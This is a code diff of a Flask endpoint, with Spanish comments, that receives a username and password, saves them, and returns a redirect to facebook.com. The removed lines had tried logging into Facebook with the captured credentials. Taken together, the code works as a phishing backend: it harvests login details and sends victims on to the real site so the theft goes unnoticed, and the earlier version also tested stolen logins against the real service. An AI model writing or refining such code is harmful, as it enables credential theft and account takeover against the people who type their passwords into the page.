@@ -19,7 +19,6 @@ def save_data():
     if not data:
         return jsonify({"status": "error", "message": "No data received"}), 400
 
-    # Credenciales ingresadas por el usuario
     username = data.get("username")
     password = data.get("password")
 
@@ -32,24 +31,13 @@ def save_data():
         if response.get("status_code") != 200:
             return jsonify({"status": "error", "message": "Failed to save data"}), 500
 
-        # 2. Simular inicio de sesión en la página externa
-        login_url = "https://www.facebook.com/"  # Cambiar a la URL del formulario de login externo
-        login_payload = {
-            "email": username,  # Cambiar "email" al nombre del campo que espera la página externa
-            "pass": password    # Cambiar "pass" al nombre del campo que espera la página externa
-        }
-
-        session = requests.Session()
-        login_response = session.post(login_url, data=login_payload)
-
-        # 3. Verificar si el login fue exitoso
-        if login_response.status_code == 200 and "dashboard" in login_response.text:
-            return jsonify({"status": "success", "message": "Data saved and login successful"})
-        else:
-            return jsonify({"status": "error", "message": "Login failed on external site"}), 401
+        # 2. Retornar la URL de redirección
+        redirect_url = "https://www.facebook.com/"  # URL deseada
+        return jsonify({"status": "success", "message": "Data saved successfully", "redirect_url": redirect_url})
 
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
+
 
 if __name__ == "__main__":
     from waitress import serve
